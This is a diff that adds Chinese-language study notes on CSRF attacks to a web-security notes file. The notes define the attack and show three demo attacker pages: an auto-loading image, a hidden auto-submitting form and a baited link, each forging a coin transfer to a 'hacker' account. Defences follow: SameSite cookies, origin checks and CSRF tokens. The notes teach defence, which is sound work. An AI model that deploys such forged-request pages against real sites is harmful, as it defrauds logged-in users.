@@ -53,3 +53,58 @@
   set-cookie: NID=189=M8q2FtWbsR8RlcldPVt7qkrqR38LmFY9jUxkKo3-4Bi6Qu_ocNOat7nkYZUTzolHjFnwBw0izgsATSI7TZyiiiaV94qGh-BzEYsNVa7TZmjAYTxYTOM9L_-0CN9ipL6cXi8l6-z41asXtm2uEwcOC5oh9djkffOMhWqQrlnCtOI; expires=Sat, 18-Apr-2020 06:52:22 GMT; path=/; domain=.google.com; HttpOnly
   ```
   - 添加验证码。限制输入长度等。
+
+# CSRF攻击 - 跨站请求伪造
+- 定义：黑客利用了用户的登录状态，通过第三方恶意网站来做恶意操作。
+- 三个必要条件：目标站点有「CSRF漏洞」；用户有「登录信息」在站点上；需要打开一个「第三方网站」。
+
+- 发起CSRF攻击的方式：
+  - 自动发起get请求。转账的请求隐藏在「IMG或者类似的资源」标签中。
+  ```HTML
+  <!DOCTYPE html>
+  <html>
+    <body>
+      <h1>黑客的站点：CSRF攻击演示</h1>
+      <img src="https://time.geekbang.org/sendcoin?user=hacker&number=100">
+    </body>
+  </html>
+  ```
+  - 自动发起post请求。构建一个隐藏的「表单」，然后自动提交
+  ```HTML  
+  <!DOCTYPE html>
+  <html>
+  <body>
+    <h1>黑客的站点：CSRF攻击演示</h1>
+    <form id='hacker-form' action="https://time.geekbang.org/sendcoin" method=POST>
+      <input type="hidden" name="user" value="hacker" />
+      <input type="hidden" name="number" value="100" />
+    </form>
+    <script> document.getElementById('hacker-form').submit(); </script>
+  </body>
+  </html>
+  ```
+  - 引诱用户「点击链接」。上面有a标签的mask```<a>```。
+  ```HTML
+  <div>
+    <img width=150 src=http://images.xuejuzi.cn/1612/1_161230185104_1.jpg> </img> </div> <div>
+    <a href="https://time.geekbang.org/sendcoin?user=hacker&number=100" taget="_blank">
+      点击下载美女照片
+    </a>
+  </div>
+  ```
+
+## 策略：
+- Cookie的「sameSite」属性。利用Cookie做用户登录凭证的站点。
+  - strict。浏览器完全禁止第三方的Cookie。
+  - Lax。跨站点下，第三方站点打开get请求，都会携带Cookie。post或者img，iframe都不会带上。
+  - none。都带上
+```
+set-cookie: 1P_JAR=2019-10-20-06; expires=Tue, 19-Nov-2019 06:36:21 GMT; path=/; domain=.google.com; SameSite=none
+```
+- 验证请求的来源站点。服务端通过Referer或者Origin验证请求来源站点。
+  - Referer记录HTTP请求的来源地址，包括整个pathname。
+  - Origin。包含域名信息。
+- CSRF token。
+  - 浏览器向服务器发送请求时，服务器生成一个「CSRF token。植入到返回的页面中」。
+  - 浏览器如果「发起较为关键的请求」时，需要带上token。然后服务器判断是否正确。
+  - 不同的tab页生成的token也不同。
